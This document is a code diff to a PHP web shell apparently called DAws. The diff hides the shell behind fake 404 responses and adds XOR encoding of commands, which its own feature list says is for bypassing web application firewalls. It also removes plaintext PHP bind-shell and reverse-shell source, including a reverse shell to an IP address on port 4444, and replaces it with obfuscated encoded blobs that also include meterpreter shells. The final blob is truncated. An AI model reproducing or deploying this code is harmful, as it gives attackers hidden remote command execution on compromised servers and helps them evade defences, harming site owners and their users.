@@ -29,6 +29,7 @@ if(isset($_POST['pass']))
 	else
 	{
 		session_destroy();
+		http_response_code(404);
 		echo "$notfound";
 		exit;
 	}
@@ -38,6 +39,7 @@ else if(isset($_SESSION['login']))
 	if ($_SESSION['login'] != true)
 	{
 		session_destroy();
+		http_response_code(404);
 		echo "$notfound";
 		exit;
 	}
@@ -45,6 +47,7 @@ else if(isset($_SESSION['login']))
 else
 {
 	session_destroy();
+	http_response_code(404);
 	echo "$notfound";
 	exit;
 }
@@ -57,6 +60,64 @@ if (isset($_GET["logout"]))
 		header("Location: ".$_SERVER['PHP_SELF']);
 	}
 }
+
+function generateRandomString($length = 10)
+{
+	$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+	$charactersLength = strlen($characters);
+	$randomString = '';
+	for ($i = 0; $i < $length; $i++)
+	{
+		$randomString .= $characters[rand(0, $charactersLength - 1)];
+	}
+	return $randomString;
+}
+
+if (!isset($_SESSION['key']))
+{
+	$_SESSION['key'] = generateRandomString();
+}
+
+function xor_this($string)
+{
+	$key = $_SESSION['key'];
+	$outText = '';
+
+ 	for($i=0;$i<strlen($string);)
+ 	{
+		for($j=0;($j<strlen($key) && $i<strlen($string));$j++,$i++)
+		{
+			$outText .= $string{$i} ^ $key{$j};
+		}
+	}
+	return base64_encode($outText);
+}
+
+function unxor_this($string)
+{
+	return base64_decode(xor_this(base64_decode($string)));
+}
+
+function sh3ll_this($string)
+{
+	$key = "dotcppfile";
+	$outText = '';
+
+ 	for($i=0;$i<strlen($string);)
+ 	{
+		for($j=0;($j<strlen($key) && $i<strlen($string));$j++,$i++)
+		{
+			$outText .= $string{$i} ^ $key{$j};
+		}
+	}
+	return base64_encode($outText);
+}
+
+function unsh3ll_this($string)
+{
+	return base64_decode(sh3ll_this(base64_decode($string)));
+}
+
 ?>
 
 <!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Strict//EN'
@@ -195,85 +256,105 @@ if (isset($_GET["logout"]))
 	}
 </style>
 
+<?php
+
+echo "
 <script>
-function base64encode(form, command) 
+
+function xor_str(string)
+{
+	var key = \"".$_SESSION['key']."\"
+	var the_res = \"\";
+	for(i=0; i<string.length;)
+	{
+		for(j=0; (j<key.length && i<string.length); ++j,++i)
+		{
+			the_res+=String.fromCharCode(string.charCodeAt(i)^key.charCodeAt(j));
+		}
+	}
+	return btoa(the_res);
+}
+
+function xorencr(form, command) 
 {
 	if (command.value == '')
 	{
-		alert("You didn't input a command mofo");
+		alert(\"You didn't input a command mofo\");
 		return false;
 	}
 
-	form.command.value = btoa(command.value);
+	form.command.value = xor_str(command.value);
 	form.submit();
 	return true;
 }
 
-function base64encode2(form, language, command) 
+function xorencr2(form, language, command) 
 {
 	if (command.value == '')
 	{
-		alert("You didn't input a command mofo");
+		alert(\"You didn't input a command mofo\");
 		return false;
 	}
 
-	form.eval.value = btoa(command.value);
+	form.eval.value = xor_str(command.value);
 	form.submit();
 	return true;
 }
 
-function base64encode3(form, original_name, new_name) 
+function xorencr3(form, original_name, new_name) 
 {
 	if ((original_name.value == '') || (new_name.value == ''))
 	{
-		alert("You didn't input a command mofo");
+		alert(\"You didn't input a command mofo\");
 		return false;
 	}
 
 	form.original_name.value = btoa(original_name.value);	
-	form.new_name.value = btoa(new_name.value);	
+	form.new_name.value = xor_str(new_name.value);	
 	form.submit();
 	return true;
 }
 
-function base64encode4(form, dir) 
+function xorencr4(form, dir) 
 {
 	if (dir.value == '')
 	{
-		alert("You didn't input a command mofo");
+		alert(\"You didn't input a command mofo\");
 		return false;
 	}
 
-	form.dir.value = btoa(dir.value);	
+	form.dir.value = xor_str(dir.value);	
 	form.submit();
 	return true;
 }
 
-function base64encode5(form, content) 
+function xorencr5(form, content) 
 {
 	if (content.value == '')
 	{
-		alert("You didn't input a command mofo");
+		alert(\"You didn't input a command mofo\");
 		return false;
 	}
 
-	form.content.value = btoa(content.value);	
+	form.content.value = xor_str(content.value);	
 	form.submit();
 	return true;
 }
 
 function showDiv()
 {
-	if (document.getElementById("features").style.display == "block") 
+	if (document.getElementById(\"features\").style.display == \"block\") 
 	{
-    		document.getElementById("features").style.display = "none";
+    		document.getElementById(\"features\").style.display = \"none\";
    	} 
 	else 
 	{
-    		document.getElementById("features").style.display = "block";
+    		document.getElementById(\"features\").style.display = \"block\";
 	}
 }
 </script>
+";
+?>
 </head>
 
 <body>
@@ -284,7 +365,7 @@ function showDiv()
 		<li>There's multiple things that makes DAws better than every Web Shell out there:</li>
 		<ol>
 			<li>Bypasses Disablers; DAws isn't just about using a particular function to get the job done, it uses up to 6 functions if needed, for example, if `shell_exec` was disabled it would automatically use `exec` or `passthru` or `system` or `popen` or `proc_open` instead, same for Downloading a File from a Link, if `Curl` was disabled then `file_get_content` is used instead and this Feature is widely used in every section and fucntion of the shell.</li>
-			<li>Automatic Base64 Encoding; DAws base64 encodes automatically most of your GET and POST data using Java Script or PHP which will allow your shell to Bypass pretty much every WAF out there.</li>
+			<li>Automatic Random Encoding; DAws randomly encodes automatically most of your GET and POST data using Java Script or PHP which will allow your shell to Bypass pretty much every WAF out there.</li>
 			<li>Advanced File Manager; DAws's File Manager contains everything a File Manager needs and even more but the main Feature is that everything is dynamically printed; the permissions of every File and Folder are checked, now, the functions that can be used will be available based on these permissions, this will save time and make life much easier.</li>
 			<li>Tools: DAws holds bunch of useful tools such as "bpscan" which can identify useable and unblocked ports on the server within few minutes which can later on allow you to go for a bind shell for example.</li>
 			<li>Everything that can't be used at all will be simply removed so Users do not have to waste their time. We're for example mentioning the execution of c++ scripts when there's no c++ compilers on the server(DAws would have checked for multiple compilers in the first place) in this case, the function would be automatically removed and the User would know.</li>
@@ -328,672 +409,17 @@ function showDiv()
 <?php
 	echo "<br><br><h1><a href=".$_SERVER['PHP_SELF'].">DAws</a></h1>";
 
-$phpbindshell = "
-<?php
-      @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);
-      \$XHuyxs=@ini_get('disable_functions');
-      if(!empty(\$XHuyxs)){
-        \$XHuyxs=preg_replace('/[, ]+/', ',', \$XHuyxs);
-        \$XHuyxs=explode(',', \$XHuyxs);
-        \$XHuyxs=array_map('trim', \$XHuyxs);
-      }else{
-        \$XHuyxs=array();
-      }
-      
-    \$port=4444;
+$phpbindshell = "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";
 
-    \$scl='socket_create_listen';
-    if(is_callable(\$scl)&&!in_array(\$scl,\$XHuyxs)){
-      \$sock=@\$scl(\$port);
-    }else{
-      \$sock=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
-      \$ret=@socket_bind(\$sock,0,\$port);
-      \$ret=@socket_listen(\$sock,5);
-    }
-    \$msgsock=@socket_accept(\$sock);
-    @socket_close(\$sock);
+$phpreverseshell = "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";
 
-    while(FALSE!==@socket_select(\$r=array(\$msgsock), \$w=NULL, \$e=NULL, NULL))
-    {
-      \$o = '';
-      \$c=@socket_read(\$msgsock,2048,PHP_NORMAL_READ);
-      if(FALSE===\$c){break;}
-      if(substr(\$c,0,3) == 'cd '){
-        chdir(substr(\$c,3,-1));
-      } else if (substr(\$c,0,4) == 'quit' || substr(\$c,0,4) == 'exit') {
-        break;
-      }else{
-        
-      if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {
-        \$c=\$c.\" 2>&1\n\";
-      }
-      \$HyNRmM='is_callable';
-      \$DjrtH='in_array';
-      
-      if(\$HyNRmM('exec')and!\$DjrtH('exec',\$XHuyxs)){
-        \$o=array();
-        exec(\$c,\$o);
-        \$o=join(chr(10),\$o).chr(10);
-      }else
-      if(\$HyNRmM('proc_open')and!\$DjrtH('proc_open',\$XHuyxs)){
-        \$handle=proc_open(\$c,array(array(pipe,'r'),array(pipe,'w'),array(pipe,'w')),\$pipes);
-        \$o=NULL;
-        while(!feof(\$pipes[1])){
-          \$o.=fread(\$pipes[1],1024);
-        }
-        @proc_close(\$handle);
-      }else
-      if(\$HyNRmM('system')and!\$DjrtH('system',\$XHuyxs)){
-        ob_start();
-        system(\$c);
-        \$o=ob_get_contents();
-        ob_end_clean();
-      }else
-      if(\$HyNRmM('popen')and!\$DjrtH('popen',\$XHuyxs)){
-        \$fp=popen(\$c,'r');
-        \$o=NULL;
-        if(is_resource(\$fp)){
-          while(!feof(\$fp)){
-            \$o.=fread(\$fp,1024);
-          }
-        }
-        @pclose(\$fp);
-      }else
-      if(\$HyNRmM('passthru')and!\$DjrtH('passthru',\$XHuyxs)){
-        ob_start();
-        passthru(\$c);
-        \$o=ob_get_contents();
-        ob_end_clean();
-      }else
-      if(\$HyNRmM('shell_exec')and!\$DjrtH('shell_exec',\$XHuyxs)){
-        \$o=shell_exec(\$c);
-      }else
-      {
-        \$o=0;
-      }
-    
-      }
-      @socket_write(\$msgsock,\$o,strlen(\$o));
-    }
-    @socket_close(\$msgsock);
-?>";
+$meterpreterbindshell = "blNLExgAbGNPRTAHEUMAER8FAwQATxwCHhQKDB5FCxkREQcCDx0JFkQbHAoDUBEAGA1EGxwGUBMJGx4ABxtULyA/ND1MBwEJGxEVUBUMAgENARNpU1APHUwRC08ACxVQEAAPEQ0CWmlUAAkbGEVZT0BXRERdY0gMFA4QBwJQW0lOVUpfWlNeQERSZm8NCVRLGQM5Cg0JCA4WDxVYQRoYFwEOGTwDHwUCCRE7HBERBhUUTkVMRBR+alQDFB8fCgcEVF5QAxIbCQQJMAcMExsDHTMWAR0CBgJYRB0PFV5AWxhUGRYICAEWEk4YVAAJGxgYRkZPaXkZAElEREAcBhUDHwUCRUUfTxAKFVhPUkwYbmZQEFBNRhoYFwEOGTwDHwUCCRE7DhcAFQASQUgWFhkHDBMbSklBVE1UfmoWEwoGHwBMSwcRBgMJCgdMX2V9RwMvEhAcAERSVEQDBBQMDQhDVH4eUBUKGgkMAk9cCgMvBQgACQUNGAZYVxUGDw4BGysAAhUHHQk6CAYHFxUeQUBFRR9lfUcDAhAaAwYPT0lDAx8FAgkROwwGBhEEAzYADBcbEQ1YMSA2JSshO1hDIz8lIjM2MD0xIj1cRjojKTs7NzNZS2xgBQNER1VHAhUVQEweRAsdBlhZXUkRb21LB0NNUBUGDw4BGysCExMDGRhNQBwGFQMfBQJFXm5mBwwTGwMdMwYIAAcGWFQVGxoWCwwfSkt6b00fOhAWBAZQTUZOHwoHBBEXV0tsFEwACBwRChZQTgAfOgcOGA8REgoMREIXABcIFQQ5Ch4ABRsRRFlZRhJmbEAcBhUDHwUCTFhEHBsAGxUSNg8XAQ4ABlgxIDYlKyE7WEMjPyUiMzYwPTEiPVxGOiMpOzs3M1lLbGBIFwEcVF5QAwkKBwAQMBYKHhROTR8XEhwbABtcRk0FFQULEBFcUEIZAxcQRk9peRkASUREQB0REFlQHUkIDAFHXVhQDWxgSBZEUlQQHxMNDBg6BQwXBgAETk0fFxIcGwAbWV1jZRYLDB8GBC8FBQMWAUdQEAIGFQYPDk1UfmpUAzkdFRUBT0lDVwMJCgcAEEhPaQ1QAwUfAEQUfmoUGQNBRV5uEn4KFlBOSEgWTU8PQxQZA0FFXkQSfmkDBw8dDw1ER1AQLwQfGQlMRBR+ABEDA0lLFhAdEQIdV1xJSAkBAVReUBYUDA0BTEsHT1BET1JMBxYKFQhLegUIHwBESAcMExsDHUtfREsYBh5QW0kfCgcEERcvAgMICE1AHFhDRFldSQ4XAQ4fWHoNbAAKRUxOUA8VHk9JF29tTFQ0FVAACAUJAQtUDB5QEgEJRQkOHQ1QAwkKBwAQQVRDJBgDGwlCF08aDFAHBxBMEQtPFwweBA8HGQBITwcMenlFSQ4EDQN+ahQZA0FFXm4SfkcRUFtJGQsUDhcIWFIoBQkLRkNURxwVCEBXb0ADEQ1QTUZNDT5DAxENVy1dY2ZBBk9JQ1dXXWMbDQ0DEUNYAxIbAAAKR1ABWVBaSUgJAQFdQwt6bxobDBAMHENYVBU2GBwUCl1DC3pvCg0WAU9TEAQCAwgBQl5PUAFQXltJChcBDhBLVANKSUgJAQFZEAQCCgwCTUANXUpLUAQbCQQPVH5qExEVDExCFwAXCBUEQVNMQQZPWl5QAwkKBwAQMAYGERROTR9JREsYBh5dFR0eCQEBXEcSWU9STAcWChUIS3pvFGYYbmVXQyMVEkkZFUQbHAZQAwkKBwAQTxIMAlASAQlFCQ4dDVADEggLAEQbG0MFAwNHZkEjIzshMTw1MksIFwgHDBMbQTRMWERLB1h6VCElIyclIyc4Vx0VDh8KBwQrFwkAA04xRVlPUBAvBB8ZCV5uCgICHFhCC0VebgsdBlhZXWNTW24=";
 
-$phpreverseshell = "
-<?php
-    \$ipaddr='192.168.1.104';
-    \$port=4444;
-    
-      @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);
-      \$dis=@ini_get('disable_functions');
-      if(!empty(\$dis)){
-        \$dis=preg_replace('/[, ]+/', ',', \$dis);
-        \$dis=explode(',', \$dis);
-        \$dis=array_map('trim', \$dis);
-      }else{
-        \$dis=array();
-      }
-      
+$meterpreterreverseshell = "blNLExgAbGMJFxYABjwCFRYGHhENARNLQFldY09FMAcRQwARHwUDBABPHAIeFAoMHkULGRERBwIPHQkWRBscCgNQEQAYDUQbHAZQEwkbHgAHG1QvOD81PUwHAQkbERVQFQwCAQ0BE2lTUA8dTBELTwALFVAQAA8RDQJaaVQZFklRRUNeTVFeQVBRQlRKXkRXV0tsTRwKFhtUXlBEUl1YXm5LHRMWUFtJLSM7JjomJEtsYwUDREcyIjwjI0lNWFlPBxcCAAkaREENH1hDUkpEQEVFH2V9QFAZFh9aRRYKBRYZAgMaTAcWDhcIFQQVSQ0XCxoaB1AEDgxMBAALBgYDA2xgSAwUT0lDUitER0xBDR9UTVItRFJmbEAGBAVQTUYoKjotITE3RktsFGZvDQlUS1hUAElRRUMcABEVEQs2HwoHBBEXLxMKAAkLEEhdQ1ZWRgAfOgcOGA8REgoMREECRl1DC3pvTR9FWU9QBVhSEgocX0tAD0cZABtTF0EUAAYXDVJPUmZsQBwrFwkAA0lRRUMcABEVEQtOV28ZTxEPAxUPD0xNTEsSQ01QQQ8fCgcEGxMVHkFATENCTx0QLxMHBQAEBgMRS1QWT0BMHm5mUBBQTUZNCk1ABgRPUFQWBh4RTVR+alQDOR0VFQFPSUNXAxIbCQQJSE9pDVADBR8ADQlUS1hUAElRRUMcGwAbFRI2DxcBDgAGV1lGT0pFDRwrABEcCggOCQFHUAVZWUYSZmxAHFReUFQAQUgMFAlYQyM/JSIzNjA9MSI9XEY6Iyk7OzczWUtsYEgXARxUXlAwFQYPDgEbKwAfHggMDxFMSwdPUFQPGUBFQB8bEQRZXWNlDAJPXEJUAgMaRUUfTxAKFVhPUkwYbmZQEC8EHxkJRVlPUxAfEw0MGEJfZQlDFRwVDEwebmYQChVYQQcDRRcAFwgVBEYPGQsHHFNKS3obYwUDREdVRwNZRhJMAQ0KXEQeH0YaAwYPCgBEWUtGFGZvFxgdFxMYRkFIFjsbDRMVWUYSTG8HDgcGUFcVHR4ABQJTWVBUCgwCRVlPEhEVEQJBSBZIT0BKS1AEGwkED1R+ABEDA0lLFgsMHwYEV1xJSAkBAVReUAMJCgcAEDAGBhEUTk0fSURbXVhQEhQMDQ5fZQlpGRZGQU1BCAoaSlALbGBPRTMKVAURGQoMCEULAVQXGBVGBA0MCk8HDBMbAx1CRUQ7HAYCFUEaTAsLTwMCCVASBkwGCwEACh4FA0VMFgtlfUBQEgcAAG9tCx0GWFldYxFvQA5UXlAFCBkNBg9HVi0cFQhLQEVAAxENWUtsTQAACk9JQ1QRPU4AAApIKVh6ekILTFhESFNYegcOAAAAREcHFwIcAwdEQQZGVF9QVAoMAkxEFH5qAwcPHQ8NREdQEC8EHxkJTEQUVGl5EwcaCUVDHAARFRELTlZFQA1UTU1QABsJBABHUBBcUEIFCQtJHAARHBUIQUgHTUZPQxICAwgHXm5mFwIDFUZOHwoHBBEXV0pGTQ5FSlJUEB8TDQwYOhYKFQdYVBVFTEEIChpOAwQUBQkLTEsWSllLRgs